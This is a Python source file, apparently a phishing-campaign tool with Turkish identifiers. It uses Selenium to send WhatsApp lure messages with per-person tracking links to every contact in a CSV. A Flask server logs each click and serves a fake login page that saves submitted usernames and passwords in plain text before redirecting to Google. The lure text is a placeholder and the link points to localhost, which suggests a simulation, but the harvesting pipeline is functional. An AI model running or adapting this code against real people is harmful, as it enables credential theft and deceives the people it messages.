import csv
import os
import random
import time
from flask import Flask, request, render_template, redirect
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from threading import Thread

app = Flask(__name__)

rid_info = {}

def load_rids_from_csv(csv_path="rids.csv"):
    if not os.path.exists(csv_path):
        return
    with open(csv_path, mode="r", encoding="utf-8") as f:
        reader = csv.DictReader(f, fieldnames=["rid", "isim", "soyisim", "telefon"])
        for row in reader:
            if row["rid"] == "rid":
                continue
            r = row["rid"]
            name = row["isim"]
            surname = row["soyisim"]
            phone = row["telefon"]
            rid_info[r] = {
                "name": name,
                "surname": surname,
                "phone": phone
            }

def save_rid_to_csv(rid, name, surname, phone, csv_path="rids.csv"):
    file_exists = os.path.exists(csv_path)
    with open(csv_path, mode="a", newline="", encoding="utf-8") as f:
        fieldnames = ["rid", "isim", "soyisim", "telefon"]
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        if not file_exists:
            writer.writeheader()
        writer.writerow({
            "rid": rid,
            "isim": name,
            "soyisim": surname,
            "telefon": phone
        })

def append_log_csv(row_data, file_path="sonuc.csv"):
    file_exists = os.path.exists(file_path)
    with open(file_path, mode="a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["event_type","rid","name","surname","phone","extra_info","timestamp"])
        writer.writerow(row_data)

def send_message(driver, phone_number, message, rid, name, surname):

    whatsapp_url = f"https://web.whatsapp.com/send?phone={phone_number}&text={message}"
    driver.get(whatsapp_url)
    time.sleep(15)  

    try:
        send_button = WebDriverWait(driver, 30).until(
            EC.element_to_be_clickable((By.XPATH, "//span[@data-icon='send']/parent::button"))
        )
        ActionChains(driver).move_to_element(send_button).click().perform()

       
        append_log_csv([
            "mesaj_send",
            rid,
            name,
            surname,
            phone_number,
            "server_script",
            time.ctime()
        ])
        print(f"[OK] Mesaj gönderildi -> {phone_number}")

    except TimeoutException:
        print(f"[ERR] Mesaj gönderilemedi (Timeout): {phone_number}")
    except Exception as e:
        try:
            driver.execute_script("arguments[0].click();", send_button)
            append_log_csv([
                "mesaj_send",
                rid,
                name,
                surname,
                phone_number,
                "server_script(JS)",
                time.ctime()
            ])
            print(f"[OK JS] Mesaj gönderildi -> {phone_number}")
        except Exception as js_error:
            print(f"[ERR JS] Mesaj gönderilemedi: {phone_number} -> {str(js_error)}")

@app.route("/")
def track_link():
    rid = request.args.get("rid")
    if rid:
        if rid in rid_info:
            data = rid_info[rid]
            name = data["name"]
            surname = data["surname"]
            phone = data["phone"]
        else:
            name, surname, phone = "unknown", "unknown", "unknown"

        user_agent = request.headers.get("User-Agent", "Unknown")

        append_log_csv([
            "clicked_link",
            rid,
            name,
            surname,
            phone,
            user_agent,
            time.ctime()
        ])

        return redirect(f"/login?rid={rid}")
    return "RID bulunamadı!", 400

@app.route("/login", methods=["GET","POST"])
def login():
    rid = request.args.get("rid")
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username and password:
            if rid and rid in rid_info:
                data = rid_info[rid]
                name = data["name"]
                surname = data["surname"]
                phone = data["phone"]
            else:
                name, surname, phone = "unknown", "unknown", "unknown"

            user_agent = request.headers.get("User-Agent", "Unknown")

            append_log_csv([
                "submited_data",
                rid,
                name,
                surname,
                phone,
                f"user={username}, pass={password}, UA={user_agent}",
                time.ctime()
            ])
            return redirect("https://www.google.com")
        else:
            return "Kullanıcı adı ve şifre zorunludur!", 400

    return render_template("login.html", rid=rid)

def generate_rid():
    return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))

def read_contacts_from_csv(file_path):
    with open(file_path, mode="r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        return list(reader)

def start_whatsapp_messaging():
    load_rids_from_csv("rids.csv")
    contacts = read_contacts_from_csv("test.csv")

    firefox_driver_path = "geckodriver.exe"
    firefox_service = Service(firefox_driver_path)
    firefox_options = Options()
    firefox_options.binary_location = "C:/Program Files/Mozilla Firefox/firefox.exe"
    firefox_options.add_argument("--start-maximized")

    driver = webdriver.Firefox(service=firefox_service, options=firefox_options)

    for c in contacts:
        name = c["isim"]
        surname = c["soyisim"]
        phone = c["telefon"]
        rid_val = generate_rid()

        
        rid_info[rid_val] = {"name": name, "surname": surname, "phone": phone}
        save_rid_to_csv(rid_val, name, surname, phone, "rids.csv")

       
        message_part1 = "some phishing screnerio"
        send_message(driver, phone, message_part1, rid_val, name, surname)
        time.sleep(3) 

       
        message_part2 = f"http://127.0.0.1:5000/?rid={rid_val}"
        send_message(driver, phone, message_part2, rid_val, name, surname)
        time.sleep(3)

    driver.quit()

if __name__ == "__main__":
    messaging_thread = Thread(target=start_whatsapp_messaging)
    messaging_thread.start()
    app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem","key.pem"))

